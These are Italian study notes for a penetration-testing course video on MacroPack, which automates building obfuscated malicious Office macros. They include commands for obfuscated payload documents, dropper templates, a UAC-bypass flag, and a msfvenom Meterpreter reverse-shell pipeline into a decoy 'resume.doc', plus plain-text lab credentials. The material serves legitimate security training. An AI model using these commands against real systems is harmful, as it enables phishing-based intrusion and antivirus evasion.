# 021 — Automating Macro Development with MacroPack - Part 1 (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 21/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [021_Automating Macro Development with MacroPack - Part 1.txt](021_Automating Macro Development with MacroPack - Part 1.txt) · [021_Automating Macro Development with MacroPack - Part 1.srt](021_Automating Macro Development with MacroPack - Part 1.srt)

## Concetti chiave

- **MacroPack** = framework Python3 open-source per **automatizzare generazione + offuscamento** macro Office (e altri payload script).
- Due edizioni: **Community** (open-source) e **Pro** (stealth avanzata, AV evasion premium).
- Richiede **Microsoft Office installato su un sistema Windows** per produrre i documenti (usa COM Automation).
- Supporta i formati Office: **Word** (`doc`, `docm`, `dot`, `dotm`, `docx`), **Excel** (`xls`, `xlsm`, `xlsx`, `xltm`), **PowerPoint** (`pptm`, `potm`), **Access** (`accdb`, `mdb`).
- Supporta script standalone: **VBS, HTA, WSF, SCT, Shell-Link (LNK)**, CHM (Pro).
- Flag chiave: **`-f <input>`** o stdin via pipe, **`-t <template>`**, **`-o`** (obfuscate), **`-G <output.doc>`**.
- **Templates built-in**: `hello`, `cmd`, `remote_cmd`, `dropper`, `dropper_ps`, `dropper_powershell_unc`, `dropper_dll_meterpreter`, `embed_exe`, `embed_dll`, …

## Spiegazione approfondita

### Perché MacroPack
Tutto ciò visto nei video 12-20 era **manuale**. MacroPack automatizza:
1. Generazione macro da template o da input arbitrario (CMD, PowerShell, VBA, MSF venom output).
2. **Offuscamento** completo: rename functions/vars/numeric constants/API imports, encoding strings, split string concatenation, rimozione spazi/commenti.
3. **Iniezione** della macro in un documento Office di formato a scelta.
4. **Cleaning metadata** del documento (rimozione hidden personal info → no attribution).

### Setup (lab INE)
Lab fornisce Windows Server con:
- Microsoft Office 2016 (richiesto).
- `Notepad++`, `WinRAR`, `netcat`, **`Macropack/macropack.exe`**.
Accesso al lab via RDP browser-based (Guacamole) al sistema di dev, secondo sistema target via RDP standard (10.100.11.128, creds `Administrator:abc_123321!@#`).

### Help + lista formati
```cmd
macropack.exe --help
macropack.exe --list-formats
```
Mostra:
- Office: word, excel, powerpoint, word97, excel97, …
- VB: vbs, hta, wsf, sct.
- Shortcuts: shell-link, explorer-command.
- Pro-only: symbolic-link, chm.

### Opzioni principali
| Flag | Descrizione |
|---|---|
| `-f <file>` | Input file (VBA macro custom) |
| `stdin (pipe)` | Input via pipe (es. da `msfvenom`) |
| `-t <template>` | Template integrato (`hello`, `cmd`, `dropper`, `dropper_ps`, …) |
| `-o` | **Obfuscate**: rename + encode + strip |
| `--obfuscate-form` | Solo rimozione spazi/comments |
| `--obfuscate-names` | Solo rename functions/vars |
| `--obfuscate-declares` | Rename Win32 API declares |
| `--obfuscate-strings` | Encode strings letterali |
| `-G <output>` | Output file (estensione determina formato) |
| `--uac-bypass` | Aggiunge UAC bypass |
| `-s <start_func>` | Override entry-point |
| `--dde` | DDE attack mode (solo Excel) |
| `-q` | Quiet |

### Esempio 1 — Calc PoC offuscato
```cmd
echo calc.exe | macropack.exe -t cmd -o -G test.doc
```
Pipeline:
1. `echo calc.exe` invia comando via stdin.
2. `-t cmd` = template "esegui CMD".
3. `-o` = full obfuscation.
4. `-G test.doc` = output Word 97-2003.

MacroPack:
- Waiting piped input feed.
- Target format: Word 97.
- Prepare Word 97 file generation.
- Generate source from CMD VBA template.
- **Rename functions / variables / numeric constants / API imports**.
- **VBA string obfuscation**: split strings, encode strings.
- **Form obfuscation**: remove spaces / comments.
- Inject VBA, remove hidden data and personal info, set security option.
- Save → `test.doc`.

Tempo: ~1 minuto.

### Risultato vittima
Vittima apre `test.doc` → enable content → `calc.exe`.
Inspezione macro: `AutoOpen` + decine di moduli/funzioni con nomi random (`WMI`, `wscript shell`, ecc. tutto offuscato).

### Senza `-o` — analisi della struttura
Senza obfuscation MacroPack splitta comunque la logica in **più moduli/funzioni**:
- `ExecuteCmdAsync` — usa `WScript.Shell` con `Run` async.
- `ExecuteCmdWMI` — alternativa via `WMI Win32_Process.Create`.
- Routing logic in `AutoOpen`.

Permette di studiare **pattern reali** di automation (WMI come alternativa a WScript.Shell è didattico).

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `macropack.exe --help` | Help completo |
| `macropack.exe --list-formats` | Lista formati supportati |
| `macropack.exe --list-templates` | Lista template payload (`hello`, `cmd`, `dropper`, …) |
| `echo "<cmd>" \| macropack.exe -t cmd -o -G out.doc` | Macro CMD offuscata |
| `msfvenom -p ... -f vba \| macropack.exe -o -G resume.doc` | Inietta + offusca payload MSF |
| `macropack.exe -f my.vba -o -G out.docm` | Macro VBA custom + obfuscation |
| `--uac-bypass` | Inserisce stub UAC bypass |

## Esempi pratici

```cmd
:: PoC base — esegue calc.exe, obfuscation completo, formato Word 97
echo calc.exe | macropack.exe -t cmd -o -G test.doc

:: Senza obfuscation, per studiare il VBA generato
echo calc.exe | macropack.exe -t cmd -G test_plain.doc

:: Excel XLSM, payload "whoami" via cmd
echo whoami | macropack.exe -t cmd -o -G accounts.xlsm
```

```cmd
:: Pipeline classico con msfvenom (parte 2 del modulo)
msfvenom -p windows/meterpreter/reverse_tcp ^
  LHOST=10.1.1.15 LPORT=4444 -f vba ^
  | macropack.exe -o -G resume.doc
```

## Punti d'attenzione per l'esame eCPPT

- **MacroPack** = tool/framework per **automazione + obfuscation** macro Office.
- Richiede **Office installato** su Windows (usa COM).
- Flag chiave:
  - **`-t cmd`** = esegui comando (input via stdin).
  - **`-t dropper`** = scarica + esegue payload remoto.
  - **`-t dropper_ps`** = dropper PowerShell.
  - **`-o`** = **full obfuscation** (sempre raccomandato).
  - **`-G <file.ext>`** = output, l'estensione determina il formato.
- Obfuscation techniques applicate: **rename functions/vars**, **split/encode strings**, **remove spaces/comments**, **rename API imports**.
- MacroPack **rimuove metadata** (hidden personal info) → no attribution.
- Supporta input da **stdin** → integrazione one-liner con `msfvenom`, `Empire stagers`, output PowerShell, ecc.
- Formati salienti per l'esame: **`.doc`** (97-2003 OPSEC-friendly), **`.docm`/`.xlsm`** (macro-enabled native), **`.hta`**, **`.vbs`**.

## Collegamenti con altri video

- Precedente: [[020_HTA Attacks]]
- Prossimo: [[022_Automating Macro Development with MacroPack - Part 2]] — droppers, MSF integration, lab live.
- Tutto il VBA manuale generato è coperto da: [[012_VBA Macro Development - Part 1]] · [[013_VBA Macro Development - Part 2]] · [[014_Weaponizing VBA Macros with MSF]].
- Pretexting per delivery: [[018_Pretexting Phishing Documents]].
- C2 stagers compatibili: modulo **Command & Control (C2)** (Empire HTA/MacroPack hooks).
